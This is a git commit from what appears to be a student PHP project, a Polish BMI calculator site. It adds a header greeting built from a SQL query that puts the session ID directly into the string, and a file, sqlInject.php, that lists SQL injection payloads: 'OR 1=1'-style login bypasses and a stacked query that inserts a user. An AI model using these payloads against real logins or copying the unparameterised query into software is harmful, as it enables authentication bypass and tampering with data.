5941a676c7bc2af0867c8dee6cef18474a6f16c6
torxnado <36035343+torxnado@users.noreply.github.com>
2019-05-29 10:15:16 +0200

    dwa

--- pai-projekt/header.php
+++ pai-projekt/header.php
@@ -2,8 +2,16 @@
 <header class="fixed-top">
 <?php
 if (isset($_SESSION["id"]) && !empty($_SESSION["id"])) {
+    $db = new PDO("sqlite:database.sqlite");
+    $idLogged = $_SESSION["id"];
+    $q = "SELECT * FROM users WHERE ID = $idLogged";
+    $r = $db->query($q);
+    foreach($r as $item) {
+        $userLogged = $item['login'];
+    }
 ?>
   <div class="d-flex flex-column flex-md-row align-items-center p-3 px-md-4 mb-3 bg-white border-bottom shadow-sm">
+      <h5 class="my-0 mr-md-auto font-weight-normal"><a class="p-3 text-dark">Witaj, <?php echo $userLogged; ?> </a></h5>
     <h5 class="my-0 mr-md-auto font-weight-normal"><a class="p-3 text-dark" href="index.php">Kalkulator BMI Online</a></h5>
     <nav class="my-2 my-md-0 mr-md-3 navbar-expand">
       <a class='p-3 text-dark' href="calculator.php" data-toggle="modal" data-target="#theModal">Oblicz BMI</a>
@@ -38,6 +46,7 @@ if (isset($_SESSION["id"]) && !empty($_SESSION["id"])) {
   </div>
 <?php
 } else {
+    $userLogged = "NDF";
 ?>
     <div class="d-flex flex-column flex-md-row align-items-center p-3 px-md-4 mb-3 bg-white border-bottom shadow-sm">
     <h5 class="my-0 mr-md-auto font-weight-normal"><a class="p-3 text-dark" href="index.php">Kalkulator BMI Online</a></h5>
---
+++ pai-projekt/sqlInject.php
@@ -0,0 +1,6 @@
+SELECT id, login, passwd FROM users WHERE login = '' AND passwd ='ndff' OR '1' = '2'; INSERT INTO users(id, login, passwd, email, registerDate) VALUES(49, 'lolnie', 'dwasad', 'xdxd@wp.pl', '28/05/2019')'"
+
+ndff' OR '1' = '1
+ndff' OR '1' = '1
+
+ndff' OR '1' = '2'; INSERT INTO users(id, login, passwd, email, registerDate) VALUES(49, 'lolnie', 'dwasad', 'xdxd@wp.pl', '28/05/2019')
